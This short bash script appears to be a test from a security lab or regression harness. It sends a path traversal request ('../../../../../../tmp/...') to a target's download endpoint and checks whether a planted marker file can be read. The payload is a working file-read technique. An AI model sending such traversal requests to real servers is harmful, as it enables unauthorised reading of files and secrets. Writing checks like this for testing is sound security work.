#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
curl -sG "$TARGET/download" --data-urlencode 'file=../../../../../../tmp/jsp-xxe-secret.txt' | grep -F 'XXE-LOCAL-FILE-MARKER-jsp-42'
